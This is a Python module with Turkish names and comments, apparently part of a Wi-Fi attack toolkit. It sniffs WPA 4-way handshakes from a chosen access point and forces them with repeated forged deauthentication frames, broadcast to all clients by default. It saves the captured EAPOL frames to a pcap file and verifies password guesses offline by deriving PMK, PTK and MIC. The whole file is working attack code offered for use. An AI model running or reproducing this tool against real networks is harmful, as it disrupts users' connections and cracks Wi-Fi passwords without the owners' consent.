#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""handshake yakalama ve doğrulama modülü."""

import hashlib
import hmac
import struct
import threading
import time
import os

# pyrefly: ignore [missing-import]
from scapy.all import (
    Dot11,
    Dot11Deauth,
    EAPOL,
    RadioTap,
    sniff,
    sendp,
    wrpcap
)

from .yapilandirma import (
    Renkler,
    HANDSHAKE_YAKALAMA_SURESI,
    HANDSHAKE_DEAUTH_PAKETI,
    HANDSHAKE_DEAUTH_ARALIGI
)


class HandshakeYakalayici:
    """wpa 4-way handshake yakalayıcı sınıfı."""

    def __init__(self, arayuz, hedef_bssid, hedef_ssid, hedef_kanal, istemci_macleri=None):
        """handshake yakalayıcıyı başlatır."""
        self.arayuz = arayuz
        self.hedef_bssid = hedef_bssid.upper()
        self.hedef_ssid = hedef_ssid
        self.hedef_kanal = hedef_kanal
        self.istemci_macleri = [m.upper() for m in (istemci_macleri or [])]

        # handshake durumu
        self.eapol_paketleri = []
        self.handshake_yakalandi = False
        self._yakalama_aktif = False
        self._yakalama_ipligi = None
        self._deauth_ipligi = None
        self._kilit = threading.Lock()

        # handshake verileri
        self.anonce = None  # ap nonce (mesaj 1)
        self.snonce = None  # istemci nonce (mesaj 2)
        self.istemci_mac = None  # istemci mac adresi
        self.mic = None  # mesaj 2 mic değeri
        self.mic_verisi = None  # mic hesaplama verisi

        # kayıt dizini
        self.kayit_dizini = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            'kayitlar'
        )
        if not os.path.exists(self.kayit_dizini):
            os.makedirs(self.kayit_dizini)

    def _eapol_paket_isle(self, paket):
        """yakalanan eapol paketlerini işler."""
        if not self._yakalama_aktif:
            return

        if not paket.haslayer(EAPOL):
            return

        if not paket.haslayer(Dot11):
            return

        dot11 = paket.getlayer(Dot11)

        # hedef bssid kontrolü
        adresler = [
            (dot11.addr1 or '').upper(),
            (dot11.addr2 or '').upper(),
            (dot11.addr3 or '').upper()
        ]

        if self.hedef_bssid not in adresler:
            return

        with self._kilit:
            self.eapol_paketleri.append(paket)

        # eapol ham verisini al
        eapol_katmani = bytes(paket.getlayer(EAPOL))

        # eapol key frame ayrıştırma
        if len(eapol_katmani) < 99:
            return

        try:
            # key info alanı
            key_info = struct.unpack('>H', eapol_katmani[5:7])[0]

            # nonce alanı
            nonce = eapol_katmani[17:49]

            # key mic alanı
            key_mic = eapol_katmani[81:97]

            # bayrak kontrolü
            install = bool(key_info & (1 << 6))
            ack = bool(key_info & (1 << 7))
            mic_var = bool(key_info & (1 << 8))

            kaynak_mac = (dot11.addr2 or '').upper()
            hedef_mac = (dot11.addr1 or '').upper()

            if ack and not mic_var:
                # mesaj 1: anonce
                self.anonce = nonce
                self.istemci_mac = hedef_mac if hedef_mac != self.hedef_bssid else kaynak_mac
                print(f"    {Renkler.YESIL}[✓] mesaj 1/4 yakalandı (ANonce){Renkler.SIFIRLA}")

            elif mic_var and not install and not ack:
                # mesaj 2: snonce ve mic
                self.snonce = nonce
                self.mic = key_mic
                self.istemci_mac = kaynak_mac if kaynak_mac != self.hedef_bssid else hedef_mac

                # mic verisini sakla
                self.mic_verisi = bytearray(eapol_katmani)
                self.mic_verisi[81:97] = b'\x00' * 16

                print(f"    {Renkler.YESIL}[✓] mesaj 2/4 yakalandı (SNonce + MIC){Renkler.SIFIRLA}")

            elif ack and mic_var and install:
                # mesaj 3
                print(f"    {Renkler.YESIL}[✓] mesaj 3/4 yakalandı{Renkler.SIFIRLA}")

            elif mic_var and not ack and not install and nonce == b'\x00' * 32:
                # mesaj 4
                print(f"    {Renkler.YESIL}[✓] mesaj 4/4 yakalandı{Renkler.SIFIRLA}")

            # handshake tamamlanma kontrolü
            if self.anonce and self.snonce and self.mic and self.mic_verisi:
                self.handshake_yakalandi = True
                self._yakalama_aktif = False
                print(f"\n    {Renkler.KALIN}{Renkler.YESIL}[✓✓✓] HANDSHAKE YAKALANDI!{Renkler.SIFIRLA}")

        except (struct.error, IndexError):
            pass

    def _deauth_tetikle(self, paket_sayisi=None, aralik=None):
        """handshake tetiklemek için deauth gönderir."""
        paket_sayisi = paket_sayisi or HANDSHAKE_DEAUTH_PAKETI
        aralik = aralik or HANDSHAKE_DEAUTH_ARALIGI

        hedef_listesi = self.istemci_macleri if self.istemci_macleri else ['ff:ff:ff:ff:ff:ff']

        tur = 0
        while self._yakalama_aktif and not self.handshake_yakalandi:
            tur += 1
            for hedef_mac in hedef_listesi:
                if not self._yakalama_aktif or self.handshake_yakalandi:
                    return

                deauth_paketi = (
                    RadioTap() /
                    Dot11(
                        type=0,
                        subtype=12,
                        addr1=hedef_mac,
                        addr2=self.hedef_bssid,
                        addr3=self.hedef_bssid
                    ) /
                    Dot11Deauth(reason=7)
                )

                try:
                    sendp(
                        deauth_paketi,
                        iface=self.arayuz,
                        count=paket_sayisi,
                        inter=0.01,
                        verbose=False
                    )
                    print(
                        f"    {Renkler.SARI}[»] deauth tur {tur} → "
                        f"{hedef_mac.upper()} ({paket_sayisi} paket){Renkler.SIFIRLA}"
                    )
                except Exception:
                    pass

            # turlar arası bekleme
            for _ in range(int(aralik * 10)):
                if not self._yakalama_aktif or self.handshake_yakalandi:
                    return
                time.sleep(0.1)

    def yakala(self, sure=None):
        """handshake yakalama işlemini başlatır."""
        sure = sure or HANDSHAKE_YAKALAMA_SURESI
        self._yakalama_aktif = True
        self.handshake_yakalandi = False
        self.eapol_paketleri = []

        print(f"\n    {Renkler.SARI}[*] eapol dinleme başlatılıyor ({sure}s)...{Renkler.SIFIRLA}")
        print(f"    {Renkler.SARI}[*] deauth ile handshake tetiklenecek...{Renkler.SIFIRLA}\n")

        # eapol dinleme görevi
        def yakalama_gorevi():
            try:
                sniff(
                    iface=self.arayuz,
                    prn=self._eapol_paket_isle,
                    timeout=sure,
                    store=False,
                    stop_filter=lambda p: not self._yakalama_aktif or self.handshake_yakalandi
                )
            except Exception as hata:
                print(f"    {Renkler.KIRMIZI}[!] yakalama hatası: {hata}{Renkler.SIFIRLA}")
            finally:
                self._yakalama_aktif = False

        self._yakalama_ipligi = threading.Thread(
            target=yakalama_gorevi,
            daemon=True,
            name="handshake_yakalama"
        )

        # deauth tetikleme görevi
        self._deauth_ipligi = threading.Thread(
            target=self._deauth_tetikle,
            daemon=True,
            name="handshake_deauth"
        )

        self._yakalama_ipligi.start()
        time.sleep(1)  # dinlemeyi bekle
        self._deauth_ipligi.start()

        # bitmesini bekle
        self._yakalama_ipligi.join(timeout=sure + 5)
        self._yakalama_aktif = False

        if self._deauth_ipligi.is_alive():
            self._deauth_ipligi.join(timeout=3)

        # sonucu kaydet
        if self.handshake_yakalandi and self.eapol_paketleri:
            self._pcap_kaydet()

        return self.handshake_yakalandi

    def _pcap_kaydet(self):
        """eapol paketlerini pcap dosyasına kaydeder."""
        try:
            guvensiz_ssid = "".join(
                c if c.isalnum() or c in ('_', '-') else '_'
                for c in self.hedef_ssid
            )
            dosya_adi = f"{guvensiz_ssid}_handshake.cap"
            dosya_yolu = os.path.join(self.kayit_dizini, dosya_adi)
            wrpcap(dosya_yolu, self.eapol_paketleri)
            print(f"    {Renkler.YESIL}[✓] handshake kaydedildi: {dosya_yolu}{Renkler.SIFIRLA}")
        except Exception as hata:
            print(f"    {Renkler.KIRMIZI}[!] pcap kaydetme hatası: {hata}{Renkler.SIFIRLA}")

    @staticmethod
    def pmk_olustur(ssid, sifre):
        """wpa pmk anahtarı oluşturur."""
        pmk = hashlib.pbkdf2_hmac(
            'sha1',
            sifre.encode('utf-8'),
            ssid.encode('utf-8'),
            4096,
            dklen=32
        )
        return pmk

    @staticmethod
    def ptk_olustur(pmk, anonce, snonce, ap_mac, istemci_mac):
        """wpa ptk anahtarı oluşturur."""
        # mac ve nonce sıralaması
        if ap_mac < istemci_mac:
            mac_sirali = ap_mac + istemci_mac
        else:
            mac_sirali = istemci_mac + ap_mac

        if anonce < snonce:
            nonce_sirali = anonce + snonce
        else:
            nonce_sirali = snonce + anonce

        # prf-512 üretimi
        b_str = b"Pairwise key expansion"
        r = b""
        for i in range(4):
            data = b_str + b'\x00' + mac_sirali + nonce_sirali + bytes([i])
            r += hmac.new(pmk, data, hashlib.sha1).digest()

        return r[:48]

    @staticmethod
    def _mac_to_bytes(mac_str):
        """mac adresini byte dizisine çevirir."""
        return bytes.fromhex(mac_str.replace(':', ''))

    def sifre_dogrula(self, sifre):
        """şifreyi yakalanan handshake ile doğrular."""
        if not self.handshake_yakalandi:
            return False

        if not all([self.anonce, self.snonce, self.mic, self.mic_verisi, self.istemci_mac]):
            return False

        try:
            # pmk oluştur
            pmk = self.pmk_olustur(self.hedef_ssid, sifre)

            # mac adreslerini çevir
            ap_mac = self._mac_to_bytes(self.hedef_bssid)
            istemci_mac = self._mac_to_bytes(self.istemci_mac)

            # ptk oluştur
            ptk = self.ptk_olustur(pmk, self.anonce, self.snonce, ap_mac, istemci_mac)

            # kck anahtarını al
            kck = ptk[:16]

            # mic hesapla
            hesaplanan_mic = hmac.new(kck, bytes(self.mic_verisi), hashlib.sha1).digest()[:16]

            return hesaplanan_mic == self.mic

        except Exception:
            return False
